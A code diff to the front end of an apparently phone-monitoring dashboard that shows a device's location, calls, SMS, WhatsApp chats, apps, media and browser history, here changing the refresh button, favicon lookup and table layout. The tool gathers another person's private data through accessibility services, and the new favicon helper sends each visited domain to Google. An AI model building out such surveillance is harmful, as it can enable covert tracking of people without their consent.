@@ -9,6 +9,15 @@ import {
 
 type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats' | 'apps' | 'media' | 'browser'
 
+function getFaviconUrl(url: string): string {
+  try {
+    const host = new URL(url).hostname
+    return `https://www.google.com/s2/favicons?domain=${host}&sz=32`
+  } catch {
+    return ''
+  }
+}
+
 const iconSelected = L.divIcon({
   className: '',
   html: '<div style="width:16px;height:16px;background:#ef4444;border:3px solid #fff;border-radius:50%;box-shadow:0 0 6px rgba(0,0,0,.5)"></div>',
@@ -162,10 +171,9 @@ export default function DevicePage() {
         <button
           onClick={loadData}
           disabled={refreshing}
-          className="ml-auto px-3 py-1.5 bg-white border border-gray-200 hover:border-indigo-300 text-gray-600 hover:text-indigo-600 text-sm font-semibold rounded-lg transition-colors disabled:opacity-50"
-          title="Refresh"
+          className="ml-auto px-4 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white text-sm font-semibold rounded-lg transition-colors disabled:opacity-50"
         >
-          {refreshing ? '⏳' : '🔄'}
+          {refreshing ? 'Refreshing…' : '↻ Refresh'}
         </button>
       </header>
 
@@ -656,43 +664,48 @@ export default function DevicePage() {
               {/* Mobile */}
               <div className="md:hidden divide-y divide-gray-100">
                 {browser.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No browser history yet. Enable the Browser accessibility service on the device.</p>}
-                {browser.map((b, i) => (
-                  <div key={i} className="flex items-start gap-3 px-4 py-3">
-                    {b.iconBase64
-                      ? <img src={`data:image/png;base64,${b.iconBase64}`} alt="" className="w-8 h-8 rounded-lg object-contain p-0.5 flex-shrink-0 mt-0.5" />
-                      : <div className="w-8 h-8 rounded-lg bg-blue-50 flex items-center justify-center text-base flex-shrink-0 mt-0.5">🌐</div>
-                    }
-                    <div className="flex-1 min-w-0">
-                      <div className="flex items-center justify-between gap-2">
-                        <p className="text-sm font-semibold text-gray-800 truncate">{b.title || b.url}</p>
-                        <p className="text-xs text-gray-400 flex-shrink-0">{fmt(b.timestamp)}</p>
+                {browser.map((b, i) => {
+                  const faviconUrl = getFaviconUrl(b.url)
+                  return (
+                    <div key={i} className="flex items-start gap-3 px-4 py-3">
+                      {faviconUrl
+                        ? <img src={faviconUrl} alt="" className="w-8 h-8 rounded-lg object-contain p-0.5 flex-shrink-0 mt-0.5" onError={e => { (e.target as HTMLImageElement).style.display = 'none' }} />
+                        : <div className="w-8 h-8 rounded-lg bg-blue-50 flex items-center justify-center text-base flex-shrink-0 mt-0.5">🌐</div>
+                      }
+                      <div className="flex-1 min-w-0">
+                        <div className="flex items-center justify-between gap-2">
+                          <p className="text-sm font-semibold text-gray-800 truncate">{b.title || b.url}</p>
+                          <p className="text-xs text-gray-400 flex-shrink-0">{fmt(b.timestamp)}</p>
+                        </div>
+                        <p className="text-xs text-blue-600 truncate mt-0.5">{b.url}</p>
+                        <p className="text-xs text-gray-400 mt-0.5">{b.browser}</p>
                       </div>
-                      <p className="text-xs text-blue-600 truncate mt-0.5">{b.url}</p>
-                      <p className="text-xs text-gray-400 mt-0.5">{b.browser}</p>
                     </div>
-                  </div>
-                ))}
+                  )
+                })}
               </div>
 
               {/* Desktop */}
               <div className="hidden md:block overflow-x-auto">
                 <table className="w-full border-collapse">
                   <thead>
-                    <tr><TH>Browser</TH><TH>Title / Domain</TH><TH>URL</TH><TH>Time</TH></tr>
+                    <tr><TH>Title / Domain</TH><TH>Browser</TH><TH>URL</TH><TH>Time</TH></tr>
                   </thead>
                   <tbody>
-                    {browser.map((b, i) => (
+                    {browser.map((b, i) => {
+                      const faviconUrl = getFaviconUrl(b.url)
+                      return (
                       <tr key={i} className="hover:bg-gray-50">
-                        <TD>
+                        <TD className="font-medium">
                           <span className="inline-flex items-center gap-1.5">
-                            {b.iconBase64
-                              ? <img src={`data:image/png;base64,${b.iconBase64}`} alt="" className="w-5 h-5 rounded object-contain flex-shrink-0" />
-                              : <span className="text-base">🌐</span>
+                            {faviconUrl
+                              ? <img src={faviconUrl} alt="" className="w-4 h-4 rounded object-contain flex-shrink-0" onError={e => { (e.target as HTMLImageElement).style.display = 'none' }} />
+                              : <span className="text-sm">🌐</span>
                             }
-                            <span className="text-xs text-gray-600">{b.browser}</span>
+                            {b.title || '—'}
                           </span>
                         </TD>
-                        <TD className="font-medium">{b.title || '—'}</TD>
+                        <TD><span className="text-xs text-gray-600">{b.browser}</span></TD>
                         <TD>
                           <a href={b.url} target="_blank" rel="noopener noreferrer"
                              className="text-blue-600 hover:underline text-xs font-mono break-all">
@@ -701,7 +714,8 @@ export default function DevicePage() {
                         </TD>
                         <TD>{fmt(b.timestamp)}</TD>
                       </tr>
-                    ))}
+                    )})
+                    }
                     {browser.length === 0 && (
                       <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No browser history yet.</td></tr>
                     )}
